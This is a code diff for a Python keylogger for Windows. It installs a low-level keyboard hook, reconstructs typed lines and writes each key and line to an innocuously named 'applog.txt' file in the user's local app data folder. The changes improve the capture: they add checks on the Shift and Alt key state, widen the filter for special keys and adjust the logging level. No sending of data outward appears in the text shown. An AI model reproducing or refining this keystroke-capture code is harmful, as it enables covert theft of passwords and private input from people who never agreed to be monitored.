@@ -8,7 +8,7 @@ import logging
 import os
 
 logging.basicConfig(filename=(os.environ['localappdata'] +"\\" + 'applog.txt'), 
-                    level=logging.DEBUG, format='%(message)s')
+                    level=logging.INFO, format='%(message)s')
 
 # Load the required librairies
 user32 = windll.user32
@@ -176,6 +176,8 @@ def hook_procedure(nCode, wParam, lParam):
     if nCode == HC_ACTION and wParam == WM_KEYDOWN:
 
         kb = KBDLLHOOKSTRUCT.from_address(lParam)
+        user32.GetKeyState(VIRTUAL_KEYS['SHIFT'])
+        user32.GetKeyState(VIRTUAL_KEYS['MENU'])
         state = (c_char * 256)()
         user32.GetKeyboardState(byref(state))
         buff = create_unicode_buffer(8)
@@ -186,13 +188,12 @@ def hook_procedure(nCode, wParam, lParam):
             # Avoid logging weird characters. If they show up,
             # get the hex code here http://asciivalue.com/index.php
             # and add to VIRTUAL_KEYS
-            if kb.vkCode != VIRTUAL_KEYS['CANCEL']:
+            if kb.vkCode not in VIRTUAL_KEYS.values():
                 line += key
 
             for key, value in VIRTUAL_KEYS.items(): 
                 if kb.vkCode == value:
                     logging.info(key)
-
 
             if kb.vkCode == VIRTUAL_KEYS['RETURN']:
                 logging.info(line)
